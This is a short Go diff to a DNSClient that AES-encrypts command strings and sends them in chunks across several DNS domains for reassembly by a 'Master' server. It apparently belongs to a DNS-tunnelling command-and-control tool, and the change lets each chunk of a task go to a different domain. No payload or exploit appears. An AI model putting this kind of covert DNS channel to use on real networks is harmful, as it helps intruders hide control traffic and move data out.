@@ -17,7 +17,6 @@ import (
 type DNSClient struct {
 	config        *Config
 	aesKey        []byte
-	taskDomainMap map[string]string    // Maps taskID to domain (ensures chunks go to same server)
 	domainIndex   int                  // For round-robin selection
 	failedDomains map[string]time.Time // Tracks temporarily failed domains
 	mutex         sync.RWMutex
@@ -32,14 +31,14 @@ func newDNSClient() *DNSClient {
 	return &DNSClient{
 		config:        &config,
 		aesKey:        aesKey,
-		taskDomainMap: make(map[string]string),
 		domainIndex:   0,
 		failedDomains: make(map[string]time.Time),
 	}
 }
 
 // selectDomain chooses a domain based on the configured selection mode
-// For tasks (identified by taskID), it ensures all chunks go to the same domain
+// Each chunk can go to a different DNS server for distributed load balancing
+// The chunk format contains taskID so Master can reassemble from any server
 func (c *DNSClient) selectDomain(taskID string) (string, error) {
 	domains := c.config.GetDomains()
 	if len(domains) == 0 {
@@ -49,16 +48,6 @@ func (c *DNSClient) selectDomain(taskID string) (string, error) {
 	// Single domain case - no selection needed
 	if len(domains) == 1 {
 		return domains[0], nil
-	}
-
-	// If this is part of a task (has taskID), check if we already selected a domain
-	if taskID != "" {
-		c.mutex.RLock()
-		if domain, exists := c.taskDomainMap[taskID]; exists {
-			c.mutex.RUnlock()
-			return domain, nil
-		}
-		c.mutex.RUnlock()
 	}
 
 	// Clean up expired failed domains (retry after 5 minutes)
@@ -138,15 +127,6 @@ func (c *DNSClient) markDomainFailed(domain string) {
 	c.mutex.Lock()
 	c.failedDomains[domain] = time.Now()
 	c.mutex.Unlock()
-}
-
-// cleanupTaskMapping removes task-to-domain mapping after task completion
-func (c *DNSClient) cleanupTaskMapping(taskID string) {
-	if taskID != "" {
-		c.mutex.Lock()
-		delete(c.taskDomainMap, taskID)
-		c.mutex.Unlock()
-	}
 }
 
 // encodeCommand encrypts and encodes a command string for DNS transmission
